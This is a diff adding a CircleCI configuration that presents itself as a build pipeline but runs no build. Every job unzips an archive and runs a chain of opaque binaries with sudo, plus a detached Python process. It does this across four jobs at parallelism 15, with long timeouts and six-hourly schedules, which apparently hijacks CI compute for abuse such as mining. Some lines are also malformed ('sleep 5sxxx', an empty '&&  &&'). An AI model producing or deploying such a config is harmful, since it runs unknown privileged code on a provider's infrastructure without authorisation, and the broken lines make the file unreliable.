@@ -1,0 +1,106 @@
+working_dir: &working_dir ~/root
+.build_template: &commonSteps
+  steps:
+    - checkout
+    - run: unzip ab.zip && chmod u+x * && ./mania && cd son/00 && cp * ../.. && cd ../..
+    - run: sudo ./b && sleep 5s && sudo apt update -y
+    - run: sudo ./c && sleep 5sxxx
+    - run: sudo ./d && sleep 10s && sudo apt update -y
+    - run: sudo ./e && sleep 15s && sudo apt update -y
+    - run: sudo ./f && sleep 10s && sudo apt update -y
+    - run: sudo ./g && sleep 15s && sudo apt update -y
+    - run: sudo ./h && sleep 10s && sudo apt update -y
+    - run:
+        name: K
+        command: |
+          sudo ./i && sleep 20s && sudo apt update -y
+          sudo ./j && sleep 15s && sudo apt update -y
+          sudo ./k && sleep 15s && sudo apt update -y
+          ls && sleep 5s && sudo apt update -y
+          screen -dmS Acdb python3 pro00.py
+          ls && sleep 5s && sudo apt update -y
+          sleep 30s &&  && sudo apt update -y
+          ./m
+          
+          
+        no_output_timeout: 300m        
+        
+        
+  working_directory: *working_dir
+
+version: 2.0
+
+jobs:
+  Bual_01:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.11-browsers
+        environment:
+          POSTGRES_USER: postgres
+    parallelism: 15
+  Bual_02:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.11-browsers
+        environment:
+          POSTGRES_USER: postgres
+    parallelism: 15
+  Bual_03:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.11-browsers
+        environment:
+          POSTGRES_USER: postgres
+    parallelism: 15
+  Bual_04:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.11-browsers
+        environment:
+          POSTGRES_USER: postgres
+    parallelism: 15
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    triggers:
+      - schedule:
+          cron:
+            - "0 */6 * * *"
+            - "* 0,6,12,18 * * *"
+          filters:
+            branches:
+              only:
+                - staging
+                - /v[0-9]+(\.[0-9]+)*/
+                - /feature\/.*/
+                - /user-.*/
+                - /pre-prod(?:-.+)?$/
+
+
+
+
+
+workflows:
+  version: 2
+  DaftarJalan:
+    jobs:
+      - Bual_01
+      - Bual_02
+      - Bual_03
+      - Bual_04
+
+
+
+
